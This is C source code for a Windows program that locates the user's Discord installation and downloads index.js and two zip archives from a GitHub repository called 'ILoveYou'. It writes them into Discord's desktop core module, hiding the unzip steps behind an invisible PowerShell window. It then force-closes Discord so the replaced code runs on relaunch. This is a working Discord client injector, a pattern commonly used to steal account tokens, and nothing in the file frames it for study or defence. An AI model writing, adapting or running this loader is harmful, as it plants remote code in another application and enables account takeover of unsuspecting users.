#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <windows.h>
#include <Lmcons.h>
#include <direct.h>
#include <io.h>

#define MAX_PATH_LEN 260

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    return fwrite(ptr, size, nmemb, stream);
}

void getUsername(char *username, size_t size) {
    DWORD len = (DWORD)size;
    if (!GetUserNameA(username, &len)) {
        exit(EXIT_FAILURE);
    }
}

void findAppFolder(const char *base_path, char *app_path) {
    struct _finddata_t file_info;
    intptr_t handle;
    char search_path[MAX_PATH_LEN];

    snprintf(search_path, MAX_PATH_LEN, "%s/app-*", base_path);
    handle = _findfirst(search_path, &file_info);
    if (handle == -1) {
        exit(EXIT_FAILURE);
    }

    snprintf(app_path, MAX_PATH_LEN, "%s/%s", base_path, file_info.name);
    _findclose(handle);
}

int downloadFile(const char *url, const char *file_path) {
    CURL *curl;
    FILE *fp;
    CURLcode res;

    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "CURL initialization failed\n");
        return EXIT_FAILURE;
    }

    fp = fopen(file_path, "wb");
    if (!fp) {
        fprintf(stderr, "Failed to open file for writing: %s\n", file_path);
        curl_easy_cleanup(curl);
        return EXIT_FAILURE;
    }

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);

    res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        fprintf(stderr, "CURL download failed: %s\n", curl_easy_strerror(res));
        fclose(fp);
        curl_easy_cleanup(curl);
        return EXIT_FAILURE;
    }

    fclose(fp);
    curl_easy_cleanup(curl);

    printf("Download completed successfully: %s\n", file_path);
    return EXIT_SUCCESS;
}

int unzip(const char *zip_file_path, const char *output_folder_path) {
    char command[MAX_PATH_LEN * 2];
    snprintf(command, sizeof(command), "powershell.exe -NoProfile -Command \"Expand-Archive -Path '%s' -DestinationPath '%s'\"", zip_file_path, output_folder_path);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessA(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "Failed to unzip file: %s\n", zip_file_path);
        return EXIT_FAILURE;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("Unzipped successfully: %s\n", zip_file_path);
    return EXIT_SUCCESS;
}

void kill_discord() {
    HINSTANCE result = ShellExecuteA(NULL, "open", "cmd.exe", "/c taskkill /IM discord.exe /F", NULL, SW_HIDE);
    if ((intptr_t)result <= 32) {
        fprintf(stderr, "Failed to close Discord.\n");
    } else {
        printf("Discord has been closed.\n");
    }
}

int main(void) {
    char username[UNLEN + 1] = {0};
    char base_path[MAX_PATH_LEN];
    char app_folder[MAX_PATH_LEN];
    char file_path[MAX_PATH_LEN];

    getUsername(username, sizeof(username));

    snprintf(base_path, MAX_PATH_LEN, "C:/Users/%s/AppData/Local/Discord", username);
    findAppFolder(base_path, app_folder);

    char target_folder[MAX_PATH_LEN];
    snprintf(target_folder, MAX_PATH_LEN, "%s/modules/discord_desktop_core-1/discord_desktop_core", app_folder);

    snprintf(file_path, MAX_PATH_LEN, "%s/modules/discord_desktop_core-1/discord_desktop_core/exe.loveletter.txt", app_folder);
    if (downloadFile("https://raw.githubusercontent.com/MrEggsBenedict/ILoveYou/refs/heads/main/loveletter.txt", file_path) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    HINSTANCE result = ShellExecuteA(NULL, "open", "notepad.exe", file_path, NULL, SW_SHOWNORMAL);
    if ((intptr_t)result <= 32) {
        return EXIT_FAILURE;
    }

    snprintf(file_path, MAX_PATH_LEN, "%s/modules/discord_desktop_core-1/discord_desktop_core/index.js", app_folder);
    if (downloadFile("https://raw.githubusercontent.com/MrEggsBenedict/ILoveYou/refs/heads/main/index.js", file_path) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    snprintf(file_path, MAX_PATH_LEN, "%s/modules/discord_desktop_core-1/discord_desktop_core/main.zip", app_folder);
    if (downloadFile("https://raw.githubusercontent.com/MrEggsBenedict/ILoveYou/refs/heads/main/main.zip", file_path) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    if (unzip(file_path, target_folder) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    snprintf(file_path, MAX_PATH_LEN, "%s/modules/discord_desktop_core-1/discord_desktop_core/node_modules.zip", app_folder);
    if (downloadFile("https://raw.githubusercontent.com/MrEggsBenedict/ILoveYou/refs/heads/main/node_modules.zip", file_path) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    if (unzip(file_path, target_folder) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }
    
    kill_discord();

    return EXIT_SUCCESS;
}
